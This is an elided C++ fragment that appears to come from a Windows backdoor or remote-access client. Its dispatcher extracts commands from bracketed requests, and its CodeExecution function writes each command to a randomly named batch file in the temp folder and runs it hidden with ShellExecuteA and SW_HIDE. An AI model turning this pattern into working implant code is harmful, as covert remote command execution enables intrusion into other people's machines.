...
std::string CommandDispatcher(std::string request){
    ...
    if( request.find("[[") != std::string::npos && 
        ...
        //extract command and commandID starting string
...
std::string CodeExecution(std::string command){
    ...
    srand((unsigned int) time(0)); // time(0) = seconds since the Unix epoch = good seed
    std::stringstream ss;
    std::stringstream stringStream;
    ss << rand(); // integer between 0 and RAND_MAX

    std::string fileName = ss.str();
    char tmp_path[MAX_PATH];
    GetTempPathA(MAX_PATH,tmp_path);
    printf("PATH to TEMP: %s\n",tmp_path); // debug
    ...
    if (ShellExecuteA(0,"open",fileBat.c_str(),"",0,SW_HIDE)){
        //Response
        //pause that allow the system to create file
        int delay[] = {50,100,1000,3000,10000};
        for(int i=0; i < 5; ++i){
            Sleep(delay[i]);
